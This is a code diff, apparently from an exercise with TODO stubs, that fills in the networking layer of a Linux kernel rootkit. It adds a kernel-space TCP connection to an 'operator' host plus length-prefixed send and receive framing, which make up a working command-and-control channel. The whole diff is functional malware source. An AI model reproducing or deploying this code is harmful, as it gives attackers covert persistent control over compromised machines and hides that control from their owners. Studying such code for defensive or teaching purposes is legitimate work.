@@ -8,58 +8,119 @@
 
 #include "rootkit.h"
 
-/*
- * TODO: Implement rk_connect.
- *
- * Create a TCP socket with sock_create_kern(&init_net, ...).
- * Fill sockaddr_in from peer_addr_str (in_aton) and peer_port (htons).
- * kernel_connect to the operator. Return socket or ERR_PTR.
- */
 struct socket *rk_connect(void)
 {
-	return ERR_PTR(-ENOSYS);
+	struct sockaddr_in peer = {
+		.sin_family = AF_INET,
+		.sin_port = htons(peer_port),
+	};
+	struct socket *sock;
+	int error;
+
+	peer.sin_addr.s_addr = in_aton(peer_addr_str);
+
+	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
+				 IPPROTO_TCP, &sock);
+	if (error)
+		return ERR_PTR(error);
+
+	error = kernel_connect(sock, (struct sockaddr_unsized *)&peer,
+			       sizeof(peer), 0);
+	if (error) {
+		sock_release(sock);
+		return ERR_PTR(error);
+	}
+
+	return sock;
 }
 
-/*
- * TODO: Implement send_exact (static).
- *
- * Send all bytes in a loop using kernel_sendmsg.
- * Handle partial sends. Return bytes sent or negative errno.
- * Return -ECONNRESET if kernel_sendmsg returns 0.
- */
+static int send_exact(struct socket *sock, const void *buf, size_t len)
+{
+	size_t sent = 0;
 
-/*
- * TODO: Implement recv_exact (static).
- *
- * Receive exactly len bytes in a loop using kernel_recvmsg.
- * Handle partial receives. Return bytes received or negative errno.
- * Return -ECONNRESET if kernel_recvmsg returns 0.
- */
+	while (sent < len) {
+		struct msghdr msg = { 0 };
+		struct kvec vec = {
+			.iov_base = (void *)((u8 *)buf + sent),
+			.iov_len = len - sent,
+		};
+		int n = kernel_sendmsg(sock, &msg, &vec, 1, len - sent);
 
-/*
- * TODO: Implement rk_send_frame.
- *
- * 2-byte big-endian length prefix: __be16 hdr = htons((u16)len).
- * send_exact the 2-byte header, then send_exact the payload.
- * Return -EMSGSIZE if len > RK_FRAME_MAX.
- * Zero-length frames are valid (just the header).
- */
+		if (n < 0)
+			return n;
+		if (n == 0)
+			return -ECONNRESET;
+		sent += n;
+	}
+
+	return sent;
+}
+
+static int recv_exact(struct socket *sock, void *buf, size_t len)
+{
+	size_t received = 0;
+
+	while (received < len) {
+		struct msghdr msg = { 0 };
+		struct kvec vec = {
+			.iov_base = (u8 *)buf + received,
+			.iov_len = len - received,
+		};
+		int n = kernel_recvmsg(sock, &msg, &vec, 1, len - received, 0);
+
+		if (n < 0)
+			return n;
+		if (n == 0)
+			return -ECONNRESET;
+		received += n;
+	}
+
+	return received;
+}
+
 int rk_send_frame(struct socket *sock, const void *buf, size_t len)
 {
-	return -ENOSYS;
+	__be16 hdr;
+	int error;
+
+	if (len > RK_FRAME_MAX)
+		return -EMSGSIZE;
+
+	hdr = htons((u16)len);
+	error = send_exact(sock, &hdr, 2);
+	if (error < 0)
+		return error;
+
+	if (len == 0)
+		return 0;
+
+	return send_exact(sock, buf, len);
 }
 
-/*
- * TODO: Implement rk_recv_frame.
- *
- * recv_exact 2 bytes for the __be16 header.
- * payload_len = ntohs(hdr).
- * Return -EMSGSIZE if payload_len > max_len.
- * Zero-length: set *out_len = 0, return 0.
- * Otherwise recv_exact payload_len bytes into buf.
- */
 int rk_recv_frame(struct socket *sock, void *buf, size_t max_len,
 		  size_t *out_len)
 {
-	return -ENOSYS;
+	__be16 hdr;
+	u16 payload_len;
+	int error;
+
+	error = recv_exact(sock, &hdr, 2);
+	if (error < 0)
+		return error;
+
+	payload_len = ntohs(hdr);
+	if (payload_len > max_len)
+		return -EMSGSIZE;
+
+	if (payload_len == 0) {
+		*out_len = 0;
+		return 0;
+	}
+
+	error = recv_exact(sock, buf, payload_len);
+	if (error < 0)
+		return error;
+
+	*out_len = payload_len;
+	return 0;
 }
